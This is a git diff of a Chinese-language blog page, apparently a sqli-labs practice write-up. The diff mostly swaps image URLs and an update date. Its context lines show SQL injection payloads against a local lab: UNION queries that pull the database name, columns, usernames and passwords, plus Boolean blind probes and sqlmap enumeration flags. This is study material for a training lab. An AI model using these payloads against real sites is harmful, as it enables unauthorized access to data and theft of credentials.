@@ -205,7 +205,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208205152774.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208205152774.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-01
+                    2021-03-19
                 </div>
                 
 
@@ -436,7 +436,7 @@ limit m,n: 从m条记录开始取n条记录
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到当前的数据库是security</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
 <p>4.查表名</p>
 <p>因为当时union select出来的数据显示2，3</p>
 <p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p>
@@ -446,18 +446,18 @@ limit m,n: 从m条记录开始取n条记录
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name &#x3D; &#39;users&#39;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以发现有三个属性</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
 <p>6.查完属性就可以查列了，把username全部调出来</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
 <p>7.最后就是查用户密码了</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p>
 <p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p>
 <p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201358085.png" alt="image-20210208201358085"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201358085.png" alt="image-20210208201358085"></p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;1 --+ 正常
 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1 and 1&#x3D;2 --+ 正常
 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5?id&#x3D;1&#39; and 1&#x3D;2 --+ 不正常
@@ -582,7 +582,7 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 <li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
 </ol>
 <p>下面有简要的操作概述</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201453846.png" alt="image-20210208201453846"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201453846.png" alt="image-20210208201453846"></p>
 <p>命令太多了，还不太熟练，目前只会用一点</p>
 <p>一些基本命令</p>
 <h4 id="1-输出等级-V"><a href="#1-输出等级-V" class="headerlink" title="1.输出等级 V"></a>1.输出等级 V</h4><p><code>V</code> 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p>
@@ -602,7 +602,7 @@ sqlmap.py -url &quot;www.baidu.com:8080&#x2F;user.php?id&#x3D;7&quot;<span aria-
 <h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p>
 <h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p>
 <h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208201601814.png" alt="image-20210208201601814"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201601814.png" alt="image-20210208201601814"></p>
 <p>这些只是一些枚举常用的，更多用法慢慢解锁吧</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉对于一些注入了解的还是不够深，有时候碰到新题自己试了各种方法总是要很久才做的出来。</p>
 <p>也可能是我数据库学的不怎么样，如果对数据库越熟悉的话做题起来应该会如鱼得水。</p>
@@ -723,7 +723,7 @@ sqlmap.py -url &quot;www.baidu.com:8080&#x2F;user.php?id&#x3D;7&quot;<span aria-
                 <a href="/2020/ba-chang/sqli-labs/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sqli-labs">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208205152774.png" class="responsive-img" alt="sqli-labs">
                         
                         <span class="card-title">sqli-labs</span>
                     </div>
